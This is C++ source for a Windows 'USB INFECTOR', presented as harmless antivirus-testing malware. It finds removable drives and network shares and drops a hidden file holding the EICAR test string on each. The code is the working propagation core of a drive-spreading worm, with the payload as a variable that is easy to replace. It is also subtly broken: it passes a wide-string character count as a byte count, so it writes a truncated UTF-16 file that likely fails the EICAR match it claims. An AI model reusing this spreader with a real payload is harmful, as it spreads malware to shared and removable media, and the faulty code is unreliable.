// --- ETHICAL MALWARE ---
// This is for malware analysis training & AV detection testing
// EICAR-LIKE: Harmless, intended to be detected and note it is not meant to be stealthy

#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

// Categories of drives to "infect"
enum TargetDriveType {
    TARGET_REMOVABLE, // USBs
    TARGET_REMOTE,    // Network shares
    TARGET_FIXED,     // Fixed drives (optional)
    TARGET_CDROM      // Optical (just for show, usually not writable)
};

std::wstring payloadName = L"EICAR_PAYLOAD"; // name of the payload
std::wstring payloadContent = L"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-TEST-FILE!$H+H*"; // eicar string to be detected by antimalware, this is the contents of the file

bool WritePayloadToDrive(const std::wstring& rootPath) {
    std::wstring targetPath = rootPath + L"\\" + payloadName;

    HANDLE hFile = CreateFileW(targetPath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"[!] Failed to write to " << targetPath << L"\n";
        return false;
    }

    DWORD written;
    WriteFile(hFile, payloadContent.c_str(), payloadContent.size(), &written, nullptr);
    CloseHandle(hFile);
    std::wcout << L"[+] Wrote payload to " << targetPath << L"\n";
    return true;
}

void InfectDrives(const std::vector<TargetDriveType>& targets) {
    DWORD drives = GetLogicalDrives();

    for (int i = 0; i < 26; ++i) {
        if (!(drives & (1 << i))) continue;

        std::wstring rootPath = std::wstring(1, 'A' + i) + L":\\";
        UINT driveType = GetDriveTypeW(rootPath.c_str());

        for (TargetDriveType target : targets) {
            if ((target == TARGET_REMOVABLE && driveType == DRIVE_REMOVABLE) ||
                (target == TARGET_REMOTE    && driveType == DRIVE_REMOTE) ||
                (target == TARGET_FIXED     && driveType == DRIVE_FIXED) ||
                (target == TARGET_CDROM     && driveType == DRIVE_CDROM)) {

                std::wcout << L"[*] Infecting " << rootPath << L" (Type " << driveType << L")...\n";
                WritePayloadToDrive(rootPath);
                break;
            }
        }
    }
}

int main() {
    std::wcout << L"=== USB INFECTOR ===\n";

    std::vector<TargetDriveType> targets = {
        TARGET_REMOVABLE,
        TARGET_REMOTE,
        // TARGET_FIXED,   // Uncomment if needed (risky)
        // TARGET_CDROM    // Usually useless
    };

    InfectDrives(targets);
    std::wcout << L"=== Done ===\n";
    return 0;
}
